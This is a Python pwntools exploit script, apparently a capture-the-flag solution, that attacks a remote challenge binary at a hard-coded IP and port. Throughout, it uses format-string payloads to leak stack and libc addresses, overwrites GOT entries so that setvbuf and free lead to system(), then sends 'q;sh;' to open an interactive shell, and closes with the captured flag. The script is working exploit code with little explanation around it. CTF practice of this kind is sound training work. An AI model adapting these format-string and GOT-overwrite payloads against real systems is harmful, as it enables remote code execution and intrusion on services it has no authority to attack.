import sys
sys.path.append('/home/ubuntu/pat/scripts/')
from pwn import *
from pwnfast import Pwn

context.terminal = ['tmux', 'splitw', '-v', '-p', '90']

PROG = './chal'

### ------------------ EXPLOIT ------------------ ###

r = Pwn(PROG, conn='54.85.45.101 8007')
# r = Pwn(PROG)

def send_payload(pay):
    r.sl(pay)
    r.ru(b'command\n')


# Identify stack pointer on the stack
pay = '|'.join([f'0x%{i}$lx' for i in [54]])
send_payload(pay)
stack = int(r.rl().strip()[2:], 16)

# Write base GOT address / setvbuf
got = 0x407000
pay = f'%{got}c%54$n'
send_payload(pay)

# Leak setvbuf
pay = b'%60$s'
send_payload(pay)
setvbuf_leak = u64(r.rb(8)) & 0xffffffffffff

libc_base = setvbuf_leak - 0x815f0
system = libc_base + 0x50d70
log.info('Leaked libc base: ' + hex(libc_base))
log.info('setvbuf: ' + hex(setvbuf_leak))
log.info('system: ' + hex(system))

##### DETERMINE LIBC VERSION #####
# Need second libc leak to determine libc version by offset
# https://libc.rip/
# Only need to do once, so commented it out
# glibc 2.35 

# # Write printf@got, 0x407008
# pay = f'%8c%54$hhn'
# send_payload(pay)

# # Leak printf
# pay = b'%60$s'
# send_payload(pay)
# printf_leak = u64(r.rb(8)) & 0xffffffffffff
# log.info('Leaked printf: ' + hex(printf_leak))

# Write printf@got, 0x407008
# pay = f'%8c%54$hhn'
# r.gdb(r.call('main', 'strlen'))
# send_payload(pay)
# r.interactive()

##### Overwrite setvbuf -> system #####
# Write lower 2 bytes to printf
lower = system & 0xffff
pay = f'%{lower}c%60$hn'
send_payload(pay)

# Move pointer down to write 3rd byte
pay = f'%2c%54$hhn'
send_payload(pay)

# Write 3rd byte
third = (system & 0xff0000) >> (4*4)
pay = f'%{third}c%60$hhn'
send_payload(pay)

##### Overwrite free@plt -> setbuf@plt #####
# Move pointer free@got
pay = f'%{0x68}c%54$hhn'
send_payload(pay)

# free@got -> setvbuf@got -> system
write = (r.plt["setvbuf"]) & 0xffff
pay = f'%{write}c%60$hn'
send_payload(pay)

pay = 'q;sh;'
r.sl(pay)

r.interactive()

# flag{s00p3r_d00p3r_h4cker_sup3ri0rity}